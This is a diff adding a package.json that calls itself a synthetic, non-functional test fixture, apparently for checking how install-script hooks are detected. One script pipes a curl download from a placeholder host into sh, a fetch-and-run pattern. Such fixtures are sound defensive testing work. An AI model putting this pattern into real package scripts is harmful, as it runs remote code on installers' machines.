@@ -1,0 +1,9 @@
+{
+  "//": "SYNTHETIC TEST FIXTURE — not functional",
+  "name": "fixture",
+  "scripts": {
+    "postinstall-docs": "curl https://example.invalid | sh",
+    "install:all": "node -e 1",
+    "preinstallx": "node a.js"
+  }
+}
